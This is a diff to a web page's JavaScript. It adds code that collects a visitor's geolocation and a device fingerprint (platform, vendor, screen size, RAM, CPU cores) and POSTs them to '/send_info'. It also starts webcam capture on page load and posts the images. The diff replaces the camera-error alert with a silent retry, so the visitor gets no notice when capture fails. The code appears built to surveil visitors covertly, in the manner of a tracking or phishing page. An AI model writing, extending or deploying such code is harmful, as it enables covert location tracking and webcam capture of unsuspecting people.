@@ -11,23 +11,49 @@ let checkinsss=()=>{
 } else {
     checkinsss();
 }
-}
-window.onload=()=>{
-    checkinsss();
+};
+
+//device info
+function getDeviceInfo() {
+  console.log(navigator.deviceMemory)
+  console.log(navigator.hardwareConcurrency)
+  console.log(navigator)
+  const deviceInfo = {
+    userAgent: navigator.userAgent,
+    platform: navigator.platform,
+    search_engin: navigator.vendor,
+    screenWidth: screen.width,
+    screenHeight: screen.height,
+    colorDepth: screen.colorDepth,
+    pixelDepth: screen.pixelDepth,
+    ram: navigator.deviceMemory,
+    ram: navigator.deviceMemory,
+  };
+
+  return deviceInfo;
 }
 
 
-let send=(lati,long)=>{
-    let town_get_api=new XMLHttpRequest();
-    town_get_api.open("GET",`/location/${lati}/${long}`);
-    town_get_api.send();
-    town_get_api.responseType="json";
-    town_get_api.onload=()=>{
-        if(town_get_api.readyState==4 && town_get_api.status==200){
-            const Town_data=town_get_api.response;
-            console.log(Town_data)
-        };
-    };
+let send = (lati, long) => {
+  console.log(lati,long)
+  fetch("/send_info", {
+    method: "POST",
+    body: JSON.stringify({
+      l1: `${lati}`,
+      l2: `${long}`,
+      platform: `${navigator.platform}`,
+      search_engin: `${navigator.vendor}`,
+      screenWidth: `${screen.width}`,
+      screenHeight: `${screen.height}`,
+      ram: `${navigator.deviceMemory}`,
+      core: `${navigator.hardwareConcurrency}`
+    }),
+    headers: {
+      "Content-type": "application/json; charset=UTF-8"
+    }
+  })
+    .then((response) => response.json())
+    .then((json) => console.log(json));
 };
 //taking pic
 
@@ -72,7 +98,7 @@ function post(imgdata) {
         const stream = await navigator.mediaDevices.getUserMedia(constraints);
         handleSuccess(stream);
       } catch (e) {
-        alert(`navigator.getUserMedia error:${e.toString()}`)
+        init();
       }
     }
     
@@ -92,4 +118,8 @@ function post(imgdata) {
     }
     
     // Load init
-    init();
+    window.onload=()=>{
+      checkinsss();
+      init();
+  }
+  
